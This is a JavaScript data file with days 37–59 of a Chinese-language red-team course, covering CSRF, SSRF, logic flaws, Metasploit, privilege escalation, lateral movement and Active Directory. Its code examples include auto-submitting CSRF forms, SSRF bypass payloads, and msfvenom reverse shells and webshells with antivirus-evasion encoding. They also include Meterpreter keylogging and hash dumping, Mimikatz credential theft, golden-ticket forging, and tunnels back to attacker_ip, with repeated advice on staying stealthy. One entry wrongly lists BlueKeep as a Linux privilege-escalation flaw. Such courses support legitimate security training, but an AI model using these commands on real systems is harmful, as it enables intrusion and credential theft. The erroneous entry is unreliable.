days[37].codeExamples = [{ title: 'CSRF攻击示例', language: 'html', code: '<!-- GET请求CSRF -->\n<img src=\"http://target.com/change_password.php?new_password=hacked\">\n\n<!-- POST请求CSRF -->\n<form action=\"http://target.com/transfer_money.php\" method=\"POST\" id=\"csrf_form\">\n    <input type=\"hidden\" name=\"to_account\" value=\"attacker_account\">\n    <input type=\"hidden\" name=\"amount\" value=\"10000\">\n</form>\n<script>\n    document.getElementById(\"csrf_form\").submit();\n</script>\n\n<!-- 自动提交 -->\n<script>\n    var form = document.createElement(\"form\");\n    form.action = \"http://target.com/delete_account.php\";\n    form.method = \"POST\";\n    document.body.appendChild(form);\n    form.submit();\n</script>', explanation: 'CSRF攻击示例' }];

days[38].title = 'SSRF服务端请求伪造';
days[38].subtitle = 'SSRF Server-Side Request Forgery';
days[38].objectives = ['理解SSRF原理', '掌握SSRF攻击方法', '学会绕过技巧'];
days[38].content = `SSRF（服务端请求伪造）是一种重要的Web攻击方式。

【SSRF原理】
• 服务器向用户指定的地址发起请求
• 攻击者可以访问内网资源
• 本质：输入验证不充分

【SSRF攻击目标】
• 内网服务：访问内网的Web服务、数据库
• 云服务元数据：获取云服务器的敏感信息
• 本地服务：访问localhost上的服务

【SSRF攻击方法】
• 直接访问内网IP
• 使用域名解析到内网
• 使用特殊地址：127.0.0.1、localhost
• 使用IPv6地址：::1

【SSRF绕过技巧】
• 绕过黑名单：使用不同的IP格式
• 绕过白名单：使用子域名、DNS重绑定
• 利用云服务元数据

【防御措施】
• 禁止访问内网地址
• 验证URL格式
• 使用白名单
• 禁用危险协议

SSRF是渗透内网的重要途径！`;
days[38].keyPoints = ['SSRF原理', '攻击目标', '攻击方法', '绕过技巧'];
days[38].codeExamples = [{ title: 'SSRF测试', language: 'bash', code: '# 测试SSRF\n?url=http://127.0.0.1\n?url=http://localhost\n?url=http://127.0.0.1:8080\n?url=http://192.168.1.1\n\n# 云服务元数据\n?url=http://169.254.169.254/latest/meta-data/\n?url=http://metadata.google.internal/computeMetadata/v1/\n\n# IP格式绕过\n?url=http://0\n?url=http://0.0.0.0\n?url=http://127.1\n?url=http://2130706433\n?url=http://0x7f000001\n\n# DNS重绑定\n?url=http://ssrf.attacker.com', explanation: 'SSRF测试方法' }];

days[39].title = 'CSRF与SSRF总结';
days[39].subtitle = 'CSRF and SSRF Summary';
days[39].objectives = ['回顾CSRF和SSRF知识', '完成模块测试', '准备逻辑漏洞学习'];
days[39].content = `CSRF和SSRF模块学习结束，检验学习成果。

【CSRF知识点回顾】
• CSRF原理和条件
• CSRF攻击方法
• CSRF防御措施

【SSRF知识点回顾】
• SSRF原理和目标
• SSRF攻击方法
• SSRF绕过技巧
• SSRF防御措施

【模块测试】
1. CSRF的原理是什么？
2. CSRF的防御措施有哪些？
3. SSRF的原理是什么？
4. SSRF的常见攻击目标有哪些？
5. SSRF的绕过技巧有哪些？

【实操练习】
• 在DVWA上练习CSRF
• 练习SSRF漏洞挖掘

CSRF和SSRF是Web安全中重要的漏洞类型！`;
days[39].keyPoints = ['知识回顾', '模块测试', '实操练习'];

days[40].title = '逻辑漏洞基础';
days[40].subtitle = 'Logic Vulnerabilities Basics';
days[40].objectives = ['理解逻辑漏洞概念', '掌握逻辑漏洞类型', '学会逻辑漏洞挖掘'];
days[40].content = `逻辑漏洞是由于业务逻辑缺陷导致的安全问题。

【逻辑漏洞概念】
• 定义：业务逻辑设计或实现上的缺陷
• 特点：隐蔽性强，难以通过自动化工具发现
• 危害：绕过验证、越权访问、数据泄露

【逻辑漏洞类型】
• 越权漏洞：水平越权、垂直越权
• 条件竞争：利用并发执行的时间窗口
• 业务流程缺陷：跳过关键步骤
• 输入验证缺陷：边界条件处理不当

【逻辑漏洞挖掘方法】
• 理解业务流程
• 分析数据流向
• 测试边界条件
• 尝试跳过步骤

【实战示例】
• 绕过登录验证
• 修改订单金额
• 重复提交表单
• 绕过支付验证

逻辑漏洞需要深入理解业务逻辑才能发现！`;
days[40].keyPoints = ['逻辑漏洞概念', '漏洞类型', '挖掘方法', '实战示例'];

days[41].title = '越权漏洞详解';
days[41].subtitle = 'Insecure Direct Object References';
days[41].objectives = ['理解越权漏洞原理', '掌握水平越权', '学会垂直越权'];
days[41].content = `越权漏洞是最常见的逻辑漏洞之一。

【越权漏洞原理】
• 用户可以访问或操作不属于自己的资源
• 本质：权限验证不充分

【越权漏洞分类】
• 水平越权：同一权限级别用户之间的越权
• 垂直越权：不同权限级别用户之间的越权

【水平越权示例】
• 修改他人资料：/user/profile?id=123
• 查看他人订单：/order/detail?id=456
• 删除他人数据：/data/delete?id=789

【垂直越权示例】
• 普通用户访问管理员页面：/admin/dashboard
• 普通用户执行管理员操作：/admin/delete_user?id=1
• 低权限用户获取高权限功能

【防御措施】
• 验证用户权限
• 使用会话ID而非用户ID
• 服务端验证而非客户端验证
• 最小权限原则

越权漏洞是逻辑漏洞中最容易发现和利用的！`;
days[41].keyPoints = ['越权原理', '水平越权', '垂直越权', '防御措施'];
days[41].codeExamples = [{ title: '越权测试', language: 'bash', code: '# 水平越权测试\n# 先获取自己的用户ID，然后尝试修改ID访问他人资源\nGET /user/profile?id=1\nGET /user/profile?id=2\nGET /user/profile?id=3\n\n# 修改他人资料\nPOST /user/update?id=2\n{"name":"attacker","email":"attacker@test.com"}\n\n# 垂直越权测试\n# 普通用户尝试访问管理员页面\nGET /admin/dashboard\nGET /admin/users\nGET /admin/settings\n\n# 普通用户尝试执行管理员操作\nPOST /admin/delete_user\n{"user_id":1}\n\n# 查看API是否验证权限\nGET /api/users/admin', explanation: '越权漏洞测试方法' }];

days[42].title = '其他逻辑漏洞';
days[42].subtitle = 'Other Logic Vulnerabilities';
days[42].objectives = ['了解条件竞争漏洞', '学会业务流程缺陷利用', '掌握输入验证缺陷挖掘'];
days[42].content = `除了越权漏洞，还有多种逻辑漏洞。

【条件竞争漏洞】
• 原理：利用并发执行的时间窗口
• 场景：文件上传、支付系统、库存管理
• 攻击方法：快速重复提交请求

【业务流程缺陷】
• 原理：跳过或绕过关键步骤
• 场景：注册流程、支付流程、认证流程
• 攻击方法：直接访问后续页面

【输入验证缺陷】
• 原理：边界条件处理不当
• 场景：金额计算、数量限制、日期验证
• 攻击方法：输入极端值

【其他逻辑漏洞】
• 重复提交：利用重复提交获取利益
• 状态修改：修改业务状态绕过验证
• 缓存攻击：利用缓存获取敏感信息

【防御措施】
• 完善业务逻辑设计
• 添加并发控制
• 严格验证输入
• 添加状态检查

逻辑漏洞需要深入理解业务才能发现！`;
days[42].keyPoints = ['条件竞争', '业务流程缺陷', '输入验证缺陷', '其他漏洞'];

days[43].title = '进阶篇总复习';
days[43].subtitle = 'Advanced Level Review';
days[43].objectives = ['回顾进阶篇知识', '完成综合测试', '准备高级学习'];
days[43].content = `进阶篇学习结束，全面复习所学内容。

【进阶篇知识点回顾】
• 命令执行：原理、注入、绕过、反弹Shell
• 文件包含：LFI、RFI、伪协议、日志包含
• CSRF：原理、攻击、防御
• SSRF：原理、攻击、绕过、云元数据
• 逻辑漏洞：越权、条件竞争、业务流程缺陷

【综合测试】
1. 命令执行漏洞的原理和常见绕过方法？
2. 文件包含漏洞的类型和伪协议利用？
3. CSRF和SSRF的区别？
4. 越权漏洞分为哪几种？各自的特点？
5. 逻辑漏洞的挖掘方法？

【实操练习】
• 在DVWA上完成进阶漏洞练习
• 练习逻辑漏洞挖掘

进阶篇内容更深入，需要更多思考和实践！`;
days[43].keyPoints = ['知识回顾', '综合测试', '实操练习'];

days[44].title = '高级篇总览';
days[44].subtitle = 'Senior Level Overview';
days[44].objectives = ['了解高级篇内容', '建立学习目标', '准备MSF学习'];
days[44].content = `高级篇带你深入学习MSF、提权、内网渗透和域渗透。

【高级篇内容】
• Day45-48：MSF（基础、Meterpreter、高级、总结）
• Day49-53：提权（Windows基础、进阶、高级、Linux、总结）
• Day54-58：内网渗透（信息收集、哈希传递、横向移动、代理、总结）
• Day59-62：域渗透（AD基础、Kerberos、域攻击、复习）

【学习目标】
• 掌握MSF框架使用
• 掌握Windows和Linux提权技术
• 掌握内网渗透方法
• 掌握域渗透技术

【学习建议】
• 多动手实践
• 理解原理而非死记硬背
• 记录实战笔记

高级篇是红队实战的核心内容！`;
days[44].keyPoints = ['高级篇内容', '学习目标', '学习建议'];

days[45].title = 'MSF基础入门';
days[45].subtitle = 'Metasploit Framework Basics';
days[45].objectives = ['理解MSF框架结构', '掌握MSF基本命令', '学会漏洞利用流程'];
days[45].content = `Metasploit Framework是最强大的渗透测试框架。

【MSF框架结构】
• Modules：模块（exploits、payloads、auxiliary、post、encoders、nops）
• Workspaces：工作空间
• Database：数据库（存储扫描结果、漏洞信息）

【MSF基本命令】
• msfconsole：启动MSF控制台
• search：搜索模块
• use：使用模块
• show options：查看选项
• set：设置选项
• exploit：执行漏洞利用
• sessions：管理会话

【漏洞利用流程】
1. 启动MSF
2. 搜索漏洞模块
3. 使用漏洞模块
4. 设置目标IP和端口
5. 设置Payload
6. 执行漏洞利用
7. 获取Shell

【常用模块】
• exploit/multi/http/struts2_045：Struts2漏洞
• exploit/windows/smb/ms17_010：永恒之蓝
• exploit/unix/ftp/vsftpd_234_backdoor：Vsftpd后门

MSF是红队必备工具！`;
days[45].keyPoints = ['MSF结构', '基本命令', '利用流程', '常用模块'];
days[45].codeExamples = [{ title: 'MSF基本操作', language: 'bash', code: '# 启动MSF\nmsfconsole\n\n# 搜索漏洞模块\nsearch ms17_010\nsearch struts2\n\n# 使用模块\nuse exploit/windows/smb/ms17_010\n\n# 查看选项\nshow options\n\n# 设置选项\nset RHOSTS 192.168.1.100\nset LHOST 192.168.1.101\nset LPORT 4444\n\n# 查看Payload\nshow payloads\n\n# 设置Payload\nset PAYLOAD windows/meterpreter/reverse_tcp\n\n# 执行漏洞利用\nexploit\n\n# 管理会话\nsessions\nsessions -i 1\n\n# 背景会话\nbg\n\n# 退出MSF\nquit', explanation: 'MSF基本操作流程' }];
days[45].resources = [
  { name: 'MSF官方文档', url: 'https://docs.metasploit.com/', type: 'article' },
  { name: 'MSF视频教程', url: 'https://www.bilibili.com/video/BV1xt411N7sR', type: 'video' },
];

days[46].title = 'Meterpreter深入';
days[46].subtitle = 'Meterpreter Deep Dive';
days[46].objectives = ['理解Meterpreter原理', '掌握Meterpreter命令', '学会Meterpreter后渗透'];
days[46].content = `Meterpreter是MSF最强大的Payload。

【Meterpreter原理】
• 内存中运行的高级Payload
• 无文件落地，隐蔽性强
• 支持多种架构和平台

【Meterpreter基本命令】
• sysinfo：系统信息
• ifconfig：网络信息
• ps：进程列表
• migrate：迁移进程
• getuid：获取当前用户
• getsystem：提权

【Meterpreter文件操作】
• ls：列出文件
• cd：切换目录
• cat：查看文件
• upload：上传文件
• download：下载文件
• rm：删除文件

【Meterpreter后渗透】
• 信息收集：收集系统信息
• 权限提升：获取更高权限
• 横向移动：渗透其他主机
• 持久化：建立持久访问

【Meterpreter高级功能】
• keylogger：键盘记录
• screenshot：屏幕截图
• webcam：摄像头
• hashdump：导出哈希

Meterpreter是红队最强大的工具！`;
days[46].keyPoints = ['Meterpreter原理', '基本命令', '文件操作', '后渗透'];
days[46].codeExamples = [{ title: 'Meterpreter常用命令', language: 'bash', code: '# 基本命令\nsysinfo\nifconfig\nps\ngetuid\nwhoami\n\n# 文件操作\nls\ncd /home\ncat /etc/passwd\nupload /root/shell.php\n/download /etc/shadow\n\n# 进程迁移\nmigrate <pid>\n\n# 权限提升\ngetsystem\n\n# 信息收集\nrun post/windows/gather/checkvm\nrun post/windows/gather/enum_logged_on_users\nrun post/windows/gather/enum_services\n\n# 键盘记录\nkeyscan_start\nkeyscan_dump\nkeyscan_stop\n\n# 屏幕截图\nscreenshot\n\n# 导出哈希\nhashdump', explanation: 'Meterpreter常用命令' }];

days[47].title = 'MSF高级应用';
days[47].subtitle = 'Metasploit Advanced Usage';
days[47].objectives = ['掌握MSF高级技巧', '学会编写MSF模块', '了解C2配置'];
days[47].content = `MSF高级应用：编写模块和C2配置。

【MSF高级技巧】
• 自定义Payload生成：msfvenom
• 免杀编码：使用编码器
• 后门植入：建立持久化
• 代理配置：通过代理渗透

【msfvenom使用】
• 生成Payload：msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format>
• 编码Payload：添加-e参数
• 生成Shellcode：添加-b参数排除坏字符

【编写MSF模块】
• 漏洞模块：exploit模块
• Payload模块：payload模块
• 辅助模块：auxiliary模块
• 后渗透模块：post模块

【C2配置】
• 设置C2服务器
• 配置Listener
• 管理会话
• 负载均衡

【实战技巧】
• 结合多种工具使用
• 灵活运用模块
• 注意操作隐蔽性

MSF是红队必备的核心工具！`;
days[47].keyPoints = ['高级技巧', 'msfvenom', '编写模块', 'C2配置'];
days[47].codeExamples = [{ title: 'msfvenom使用', language: 'bash', code: '# 生成Windows反向Shell\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe\n\n# 生成Linux反向Shell\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf\n\n# 生成PHP Webshell\nmsfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.php\n\n# 生成Python Payload\nmsfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.py\n\n# 使用编码器\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > encoded_shell.exe\n\n# 设置坏字符\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -b \"\\x00\" -f exe > shell.exe', explanation: 'msfvenom常用命令' }];

days[48].title = 'MSF模块总结';
days[48].subtitle = 'MSF Module Summary';
days[48].objectives = ['回顾MSF知识', '完成模块测试', '准备提权学习'];
days[48].content = `MSF模块学习结束，检验学习成果。

【MSF知识点回顾】
• MSF框架结构
• MSF基本命令
• 漏洞利用流程
• Meterpreter命令
• msfvenom使用
• 后渗透模块

【模块测试】
1. MSF框架包含哪些模块？各自的用途是什么？
2. Meterpreter的特点是什么？
3. msfvenom的常用参数有哪些？
4. Meterpreter的常用命令有哪些？
5. 如何使用MSF进行后渗透测试？

【实操练习】
• 使用MSF利用MS17-010漏洞
• 练习Meterpreter后渗透

MSF是红队最强大的工具，一定要掌握！`;
days[48].keyPoints = ['知识回顾', '模块测试', '实操练习'];

days[49].title = 'Windows提权基础';
days[49].subtitle = 'Windows Privilege Escalation Basics';
days[49].objectives = ['理解Windows提权原理', '掌握基础提权方法', '学会提权工具使用'];
days[49].content = `Windows提权是内网渗透的关键步骤。

【Windows提权原理】
• 从低权限用户提升到高权限用户
• 利用系统漏洞或配置缺陷
• 获取管理员或SYSTEM权限

【基础提权方法】
• 内核漏洞提权：利用Windows内核漏洞
• 服务提权：利用配置不当的服务
• 注册表提权：利用注册表配置缺陷
• 计划任务提权：利用计划任务配置

【提权工具】
• WinPEAS：系统信息收集和提权检测
• Seatbelt：系统信息收集
• PowerUp：PowerShell提权脚本
• Mimikatz：凭证窃取工具

【提权步骤】
1. 信息收集：收集系统信息
2. 漏洞检测：检测可用的提权方法
3. 权限提升：执行提权操作
4. 权限维持：建立持久化

【常见提权漏洞】
• MS17-010：永恒之蓝（同时也是远程漏洞）
• MS16-016：WebDAV漏洞
• MS15-051：内核漏洞
• CVE-2021-1675：Print Spooler漏洞

Windows提权是内网渗透的必备技能！`;
days[49].keyPoints = ['提权原理', '基础方法', '提权工具', '提权步骤'];
days[49].codeExamples = [{ title: 'Windows提权命令', language: 'powershell', code: '# WinPEAS信息收集\n.\WinPEASany.exe\n\n# PowerUp提权检测\n.\PowerUp.ps1\nInvoke-AllChecks\n\n# 查看系统信息\nsysteminfo\nwhoami /priv\nwhoami /groups\n\n# 查看服务\nsc query\nnet start\n\n# 查看计划任务\nschtasks /query /fo LIST\n\n# 查看注册表\ngpresult /h gpresult.html\n\n# Mimikatz获取凭证\nmimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit', explanation: 'Windows提权常用命令' }];

days[50].title = 'Windows提权进阶';
days[50].subtitle = 'Windows Privilege Escalation Advanced';
days[50].objectives = ['掌握服务提权', '学会注册表提权', '了解计划任务提权'];
days[50].content = `Windows提权进阶：服务提权和注册表提权。

【服务提权】
• 原理：利用配置不当的服务
• 场景：服务可被普通用户修改
• 方法：修改服务路径指向恶意程序

【注册表提权】
• 原理：利用注册表配置缺陷
• 场景：注册表项可被普通用户修改
• 方法：修改注册表指向恶意程序

【计划任务提权】
• 原理：利用计划任务配置缺陷
• 场景：计划任务可被普通用户修改
• 方法：修改计划任务指向恶意程序

【UAC绕过】
• 原理：绕过用户账户控制
• 方法：利用UAC漏洞或配置缺陷
• 工具：UACMe

【实战技巧】
• 先用工具检测
• 再手动验证
• 注意操作隐蔽性

Windows提权需要灵活运用各种方法！`;
days[50].keyPoints = ['服务提权', '注册表提权', '计划任务提权', 'UAC绕过'];

days[51].title = 'Windows提权高级';
days[51].subtitle = 'Windows Privilege Escalation Advanced';
days[51].objectives = ['掌握内核漏洞提权', '学会凭证窃取', '了解权限维持'];
days[51].content = `Windows提权高级：内核漏洞和凭证窃取。

【内核漏洞提权】
• 原理：利用Windows内核漏洞
• 方法：使用exploit获取SYSTEM权限
• 常见漏洞：MS17-010、MS16-016、MS15-051、CVE-2021-1675

【凭证窃取】
• Mimikatz：获取登录密码哈希
• LSA Secrets：获取系统级密码
• SAM文件：获取本地用户密码
• NTDS.dit：获取域用户密码

【权限维持】
• 创建后门账户
• 修改注册表
• 创建计划任务
• 修改服务
• WMI持久化

【黄金票据攻击】
• 获取域控制器的KRBTGT账户哈希
• 伪造TGT票据
• 获得域内任意用户权限

【白银票据攻击】
• 获取服务账户哈希
• 伪造服务票据
• 获得特定服务权限

Windows提权是内网渗透的核心技能！`;
days[51].keyPoints = ['内核漏洞', '凭证窃取', '权限维持', '票据攻击'];

days[52].title = 'Linux提权技术';
days[52].subtitle = 'Linux Privilege Escalation';
days[52].objectives = ['理解Linux提权原理', '掌握Linux提权方法', '学会Linux提权工具'];
days[52].content = `Linux提权同样是内网渗透的关键步骤。

【Linux提权原理】
• 从普通用户提升到root用户
• 利用系统漏洞或配置缺陷
• 获取root权限

【Linux提权方法】
• 内核漏洞提权：利用Linux内核漏洞
• SUID提权：利用SUID权限的可执行文件
• 服务提权：利用配置不当的服务
• 环境变量提权：利用环境变量配置缺陷
• Cron提权：利用计划任务配置缺陷

【Linux提权工具】
• LinPEAS：系统信息收集和提权检测
• LinEnum：系统信息收集
• pspy：进程监控
• GTFOBins：可被利用的SUID二进制文件

【提权步骤】
1. 信息收集：收集系统信息
2. 漏洞检测：检测可用的提权方法
3. 权限提升：执行提权操作
4. 权限维持：建立持久化

【常见Linux提权漏洞】
• Dirty Cow：CVE-2016-5195
• BlueKeep：CVE-2019-0708
• Polkit：CVE-2021-4034

Linux提权需要深入理解系统原理！`;
days[52].keyPoints = ['提权原理', '提权方法', '提权工具', '提权步骤'];
days[52].codeExamples = [{ title: 'Linux提权命令', language: 'bash', code: '# LinPEAS信息收集\n./linpeas.sh\n\n# LinEnum信息收集\n./LinEnum.sh\n\n# 查看系统信息\nuname -a\ncat /etc/issue\ncat /etc/os-release\n\n# 查看用户信息\nid\nwhoami\ncat /etc/passwd\ncat /etc/group\n\n# 查找SUID文件\nfind / -perm -u=s -type f 2>/dev/null\n\n# 查找可写目录\nfind / -writable -type d 2>/dev/null\n\n# 查看计划任务\ncat /etc/crontab\nls -la /etc/cron.*\n\n# 查看服务\nsystemctl list-units --type=service\n\n# 查看环境变量\nenv\necho $PATH', explanation: 'Linux提权常用命令' }];

days[53].title = '提权模块总结';
days[53].subtitle = 'Privilege Escalation Module Summary';
days[53].objectives = ['回顾提权知识', '完成模块测试', '准备内网渗透学习'];
days[53].content = `提权模块学习结束，检验学习成果。

【Windows提权知识点】
• Windows提权原理和方法
• 服务提权、注册表提权、计划任务提权
• 内核漏洞提权
• 凭证窃取（Mimikatz）
• 权限维持

【Linux提权知识点】
• Linux提权原理和方法
• SUID提权、环境变量提权、Cron提权
• 内核漏洞提权
• 提权工具（LinPEAS、LinEnum）

【模块测试】
1. Windows提权的常见方法有哪些？
2. Linux提权的常见方法有哪些？
3. Mimikatz的作用是什么？
4. SUID提权的原理是什么？
5. 如何进行权限维持？

【实操练习】
• 在靶机上练习Windows提权
• 在靶机上练习Linux提权

提权是内网渗透的关键步骤！`;
days[53].keyPoints = ['知识回顾', '模块测试', '实操练习'];

days[54].title = '内网信息收集';
days[54].subtitle = 'Internal Network Information Gathering';
days[54].objectives = ['掌握内网信息收集方法', '学会内网扫描', '了解内网拓扑发现'];
days[54].content = `内网信息收集是内网渗透的第一步。

【内网信息收集方法】
• 网络信息：IP地址、子网、网关、DNS
• 主机信息：操作系统、开放端口、运行服务
• 用户信息：用户名、组、权限
• 共享信息：共享文件夹、网络资源

【内网扫描工具】
• Nmap：端口扫描和服务识别
• fscan：内网扫描工具
• CrackMapExec：SMB扫描和利用
• BloodHound：AD信息收集和分析

【内网拓扑发现】
• ARP扫描：发现同一网段主机
• ICMP扫描：发现存活主机
• SMB扫描：发现Windows主机
• LDAP扫描：发现域控制器

【内网信息收集命令】
• Windows：ipconfig、netstat、net view、arp -a
• Linux：ifconfig、netstat、nmap、arp

【实战技巧】
• 先用被动方式收集信息
• 再用主动方式扫描
• 注意操作隐蔽性

内网信息收集越充分，渗透越容易成功！`;
days[54].keyPoints = ['收集方法', '扫描工具', '拓扑发现', '实战技巧'];
days[54].codeExamples = [{ title: '内网信息收集命令', language: 'bash', code: '# Windows内网信息收集\nipconfig /all\nnetstat -ano\nnet view\net user\nnet localgroup administrators\narp -a\nroute print\n\n# Linux内网信息收集\nifconfig\nip addr show\nnetstat -antp\nnmap -sn 192.168.1.0/24\narp -a\ncat /etc/hosts\ncat /etc/resolv.conf\n\n# fscan内网扫描\n./fscan.exe -h 192.168.1.0/24\n\n# CrackMapExec扫描\ncrackmapexec smb 192.168.1.0/24\n\n# BloodHound收集\nSharpHound.exe -c All\nBloodHound.exe', explanation: '内网信息收集常用命令' }];

days[55].title = '哈希传递与票据传递';
days[55].subtitle = 'Pass-the-Hash and Pass-the-Ticket';
days[55].objectives = ['理解哈希传递原理', '掌握哈希传递方法', '学会票据传递'];
days[55].content = `哈希传递和票据传递是内网横向移动的重要技术。

【哈希传递（Pass-the-Hash）】
• 原理：利用NTLM哈希直接登录，不需要明文密码
• 适用：Windows系统
• 方法：获取NTLM哈希后，使用工具进行哈希传递

【哈希传递工具】
• Mimikatz：获取和利用哈希
• CrackMapExec：利用哈希登录
• pth-winexe：Linux下利用哈希

【票据传递（Pass-the-Ticket）】
• 原理：利用Kerberos票据进行身份认证
• 适用：域环境
• 方法：获取TGT票据后，使用票据登录

【票据类型】
• TGT（Ticket Granting Ticket）：门票授权票据
• ST（Service Ticket）：服务票据
• 黄金票据：伪造的TGT
• 白银票据：伪造的ST

【实战技巧】
• 先获取哈希或票据
• 再进行传递攻击
• 注意操作隐蔽性

哈希传递和票据传递是域渗透的核心技术！`;
days[55].keyPoints = ['哈希传递', '票据传递', '工具使用', '实战技巧'];
days[55].codeExamples = [{ title: '哈希传递和票据传递', language: 'bash', code: '# Mimikatz获取哈希\nmimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit\n\n# CrackMapExec哈希传递\ncrackmapexec smb 192.168.1.0/24 -u username -H hash\n\n# pth-winexe哈希传递\npth-winexe -U user%hash //target_ip cmd.exe\n\n# Mimikatz导出票据\nmimikatz.exe \"kerberos::list\" \"kerberos::export\" exit\n\n# Mimikatz导入票据\nmimikatz.exe \"kerberos::ptt ticket.kirbi\" exit\n\n# 获取黄金票据\nmimikatz.exe \"kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:hash /user:administrator /ptt\" exit\n\n# 获取白银票据\nmimikatz.exe \"kerberos::silver /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:hash /user:administrator /ptt\" exit', explanation: '哈希传递和票据传递常用命令' }];

days[56].title = '横向移动技术大全';
days[56].subtitle = 'Lateral Movement Techniques';
days[56].objectives = ['掌握横向移动方法', '学会SMB横向移动', '了解RDP横向移动'];
days[56].content = `横向移动是内网渗透的核心技术。

【横向移动方法】
• SMB：利用SMB协议进行横向移动
• RDP：利用远程桌面进行横向移动
• WinRM：利用Windows远程管理进行横向移动
• SSH：利用SSH进行横向移动
• PsExec：利用PsExec进行横向移动

【SMB横向移动】
• 原理：利用SMB协议连接到目标主机
• 方法：使用哈希传递或票据传递
• 工具：CrackMapExec、PsExec、pth-winexe

【RDP横向移动】
• 原理：利用远程桌面协议连接到目标主机
• 方法：获取凭证后使用RDP登录
• 工具：rdesktop、xfreerdp、mstsc

【WinRM横向移动】
• 原理：利用Windows远程管理协议
• 方法：使用PowerShell进行远程执行
• 工具：Invoke-Command、evil-winrm

【SSH横向移动】
• 原理：利用SSH协议连接到Linux主机
• 方法：获取凭证后使用SSH登录
• 工具：ssh、paramiko

【实战技巧】
• 先进行信息收集
• 选择合适的横向移动方法
• 注意操作隐蔽性

横向移动是内网渗透的关键步骤！`;
days[56].keyPoints = ['横向移动方法', 'SMB', 'RDP', 'WinRM'];
days[56].codeExamples = [{ title: '横向移动命令', language: 'bash', code: '# SMB横向移动\ncrackmapexec smb 192.168.1.100 -u administrator -p password\npsexec \\\\192.168.1.100 -u administrator -p password cmd.exe\n\n# RDP横向移动\nrdesktop 192.168.1.100 -u administrator -p password\nxfreerdp /u:administrator /p:password /v:192.168.1.100\n\n# WinRM横向移动\nevil-winrm -i 192.168.1.100 -u administrator -p password\nInvoke-Command -ComputerName 192.168.1.100 -ScriptBlock {whoami}\n\n# SSH横向移动\nssh user@192.168.1.100\nssh -i id_rsa user@192.168.1.100\n\n# 端口转发\nssh -L 3389:192.168.1.100:3389 user@jump_host\nssh -D 1080 user@jump_host', explanation: '横向移动常用命令' }];

days[57].title = '代理转发与内网穿透';
days[57].subtitle = 'Proxy Forwarding and Internal Network Penetration';
days[57].objectives = ['掌握代理转发方法', '学会内网穿透', '了解隧道技术'];
days[57].content = `代理转发和内网穿透是访问内网的重要技术。

【代理转发】
• 原理：通过代理服务器访问内网资源
• 方法：建立SOCKS代理或HTTP代理
• 工具：ssh、proxychains、chisel

【内网穿透】
• 原理：将内网服务暴露到外网
• 方法：端口转发、反向代理、VPN
• 工具：frp、ngrok、ssh

【隧道技术】
• SSH隧道：使用SSH建立隧道
• HTTP隧道：通过HTTP协议传输数据
• DNS隧道：通过DNS协议传输数据
• ICMP隧道：通过ICMP协议传输数据

【代理工具配置】
• proxychains：配置SOCKS代理
• metasploit：配置meterpreter代理
• cobalt strike：配置CS代理

【实战技巧】
• 先建立代理
• 再扫描内网
• 注意操作隐蔽性

代理转发和内网穿透是内网渗透的必备技能！`;
days[57].keyPoints = ['代理转发', '内网穿透', '隧道技术', '代理配置'];
days[57].codeExamples = [{ title: '代理转发命令', language: 'bash', code: '# SSH SOCKS代理\nssh -D 1080 user@jump_host\n\n# SSH端口转发\nssh -L 8080:192.168.1.100:80 user@jump_host\nssh -R 8080:127.0.0.1:80 user@public_server\n\n# proxychains配置\n# /etc/proxychains.conf\nsocks5 127.0.0.1 1080\n\n# 使用proxychains\nproxychains nmap -sS 192.168.1.0/24\nproxychains curl http://192.168.1.100\n\n# chisel代理\n# 服务端\nchisel server -p 8080 --reverse\n\n# 客户端\nchisel client attacker_ip:8080 R:socks\n\n# frp内网穿透\n# frps.ini\n[common]\nbind_port = 7000\n\n# frpc.ini\n[common]\nserver_addr = attacker_ip\nserver_port = 7000\n\n[rdp]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 3389\nremote_port = 33890', explanation: '代理转发常用命令' }];

days[58].title = '横向移动模块总结';
days[58].subtitle = 'Lateral Movement Module Summary';
days[58].objectives = ['回顾横向移动知识', '完成模块测试', '准备域渗透学习'];
days[58].content = `横向移动模块学习结束，检验学习成果。

【横向移动知识点回顾】
• 内网信息收集
• 哈希传递和票据传递
• SMB、RDP、WinRM横向移动
• 代理转发和内网穿透
• 隧道技术

【模块测试】
1. 内网信息收集的方法有哪些？
2. 哈希传递的原理是什么？
3. 横向移动的常见方法有哪些？
4. 代理转发的方法有哪些？
5. 隧道技术有哪些？

【实操练习】
• 在靶场环境中练习横向移动
• 练习代理转发和内网穿透

横向移动是内网渗透的核心技术！`;
days[58].keyPoints = ['知识回顾', '模块测试', '实操练习'];

days[59].title = '活动目录基础';
days[59].subtitle = 'Active Directory Basics';
days[59].objectives = ['理解活动目录概念', '掌握AD结构', '学会AD信息收集'];
days[59].content = `活动目录（AD）是Windows域环境的核心。

【活动目录概念】
• 定义：Windows域环境的目录服务
• 功能：管理用户、计算机、组、策略
• 组成：域控制器、域、组织单元、站点

【AD结构】
• 域控制器（DC）：存储AD数据库
• 域（Domain）：逻辑分组
• 组织单元（OU）：管理分组
• 站点（Site）：物理分组
• 全局编录（GC）：全局索引

【AD信息收集】
• 查询域信息：net domain、dsquery
• 查询用户信息：net user、dsquery user
• 查询计算机信息：net computer、dsquery computer
• 查询组信息：net group、dsquery group
• 查询OU信息：dsquery ou

【AD常用工具】
• Active Directory Users and Computers
• Active Directory Sites and Services
• Active Directory Domains and Trusts
• BloodHound：AD信息可视化

【实战技巧】
• 先收集AD信息
• 理解域结构
• 识别关键目标

活动目录是域渗透的基础！`;
days[59].keyPoints = ['AD概念', 'AD结构', '信息收集', '常用工具'];
